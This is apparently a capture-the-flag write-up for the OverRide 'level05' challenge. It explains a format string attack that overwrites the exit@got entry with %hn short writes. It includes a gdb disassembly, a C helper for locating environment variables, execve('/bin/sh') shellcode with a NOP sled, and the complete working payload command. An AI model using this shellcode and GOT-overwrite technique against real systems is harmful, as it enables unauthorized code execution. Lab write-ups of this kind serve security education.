The program calls the `exit(0)` function immediately after the `printf` call. Therefore, changing the Return Address (RET) on the Stack is ineffective.
We will perform a jmp operation to the shellcode via the **Global Offset Table (GOT)** of the `exit` function. This way, when the program attempts to “exit,” it will actually execute our shellcode.

```
level05@OverRide:~$ echo "AAAA %p %p %p %p %p %p %p %p %p %p" | ./level05 
aaaa 0x64 0xf7fcfac0 0xf7ec3af9 0xffffd53f 0xffffd53e (nil) 0xffffffff 0xffffd5c4 0xf7fdb000 0x61616161
```

First of all, we needed to find the offset of printf.


```diff
+(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	push   %edi
   0x08048448 <+4>:	push   %ebx
   0x08048449 <+5>:	and    $0xfffffff0,%esp
   0x0804844c <+8>:	sub    $0x90,%esp
   0x08048452 <+14>:	movl   $0x0,0x8c(%esp)
   0x0804845d <+25>:	mov    0x80497f0,%eax
   0x08048462 <+30>:	mov    %eax,0x8(%esp)
   0x08048466 <+34>:	movl   $0x64,0x4(%esp)
   0x0804846e <+42>:	lea    0x28(%esp),%eax
   0x08048472 <+46>:	mov    %eax,(%esp)
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
   0x0804847a <+54>:	movl   $0x0,0x8c(%esp)
   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
   0x08048487 <+67>:	lea    0x28(%esp),%eax
   0x0804848b <+71>:	add    0x8c(%esp),%eax
   0x08048492 <+78>:	movzbl (%eax),%eax
   0x08048495 <+81>:	cmp    $0x40,%al
   0x08048497 <+83>:	jle    0x80484cb <main+135>
   0x08048499 <+85>:	lea    0x28(%esp),%eax
   0x0804849d <+89>:	add    0x8c(%esp),%eax
---Type <return> to continue, or q <return> to quit---
   0x080484a4 <+96>:	movzbl (%eax),%eax
   0x080484a7 <+99>:	cmp    $0x5a,%al
   0x080484a9 <+101>:	jg     0x80484cb <main+135>
   0x080484ab <+103>:	lea    0x28(%esp),%eax
   0x080484af <+107>:	add    0x8c(%esp),%eax
   0x080484b6 <+114>:	movzbl (%eax),%eax
   0x080484b9 <+117>:	mov    %eax,%edx
   0x080484bb <+119>:	xor    $0x20,%edx
   0x080484be <+122>:	lea    0x28(%esp),%eax
   0x080484c2 <+126>:	add    0x8c(%esp),%eax
   0x080484c9 <+133>:	mov    %dl,(%eax)
   0x080484cb <+135>:	addl   $0x1,0x8c(%esp)
   0x080484d3 <+143>:	mov    0x8c(%esp),%ebx
   0x080484da <+150>:	lea    0x28(%esp),%eax
   0x080484de <+154>:	movl   $0xffffffff,0x1c(%esp)
   0x080484e6 <+162>:	mov    %eax,%edx
   0x080484e8 <+164>:	mov    $0x0,%eax
   0x080484ed <+169>:	mov    0x1c(%esp),%ecx
   0x080484f1 <+173>:	mov    %edx,%edi
   0x080484f3 <+175>:	repnz scas %es:(%edi),%al
   0x080484f5 <+177>:	mov    %ecx,%eax
   0x080484f7 <+179>:	not    %eax
   0x080484f9 <+181>:	sub    $0x1,%eax
---Type <return> to continue, or q <return> to quit---
   0x080484fc <+184>:	cmp    %eax,%ebx
   0x080484fe <+186>:	jb     0x8048487 <main+67>
   0x08048500 <+188>:	lea    0x28(%esp),%eax
   0x08048504 <+192>:	mov    %eax,(%esp)
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	movl   $0x0,(%esp)
+   0x08048513 <+207>:	call   0x8048370 <exit@plt>
End of assembler dump.
+(gdb) disas exit
Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
```

**Target Address (`exit@got`):** `0x080497e0`

Now we need to create a shellcode and write a simple C code that will get its address.

```
#include <stdio.h>
#include <stdlib.h>

int main(int ac, char **av)
{
        if (ac == 2)
        {
                char* ptr = getenv(av[1]);
                printf("%p\n", ptr);
        }
}
```

We save this as **/tmp/shellcode.c**. We need to compile it as 32-bit. Therefore;
```
gcc -m32 /tmp/shellcode.c -o /tmp/shellcode
```

```
export payload=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

```
level05@OverRide:~$ /tmp/shellcode payload
0xffffd7b1
```

This allows us to obtain our shellcode memory address.

**Shellcode Address:** `0xffffd7b1`

Our shellcode address (`0xffffd7b1`) corresponds to the decimal value **4,294,956,977**.

### Why Did We Split the Address in Two?
In a format string attack, writing with `%n` requires printing that number of characters to the screen. Printing 4.3 billion characters at once can cause the program to crash, time out, or take hours to complete.

To solve this problem, the **Short Write (`%hn`)** technique was used. The 32-bit address was written by splitting it into two 16-bit parts:

* **Low Part:** `0xd7b1` (55217) -> written to the `exit@got` address.
* **High Part:** `0xffff` (65535) -> written to the address `exit@got + 2`.

Thus, instead of 4 billion characters, only ~65,000 characters were printed, and the process was completed in milliseconds and in a stable manner.

## Calculation
* **Start:** There are 2 addresses (8 bytes) at the beginning of the payload.
* **1st Write (Low - 55217):**
    * Required Padding: `55217 - 8 = 55209`
    * Written Location: Offset 10 (`exit@got`)
* **2nd Write (High - 65535):**
    * Required Padding: `65535 - 55217 = 10318`
    * Written Location: Offset 11 (`exit@got + 2`)

```bash
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55209x%10$hn" + "%10318x%11$hn"'; cat) | ./level05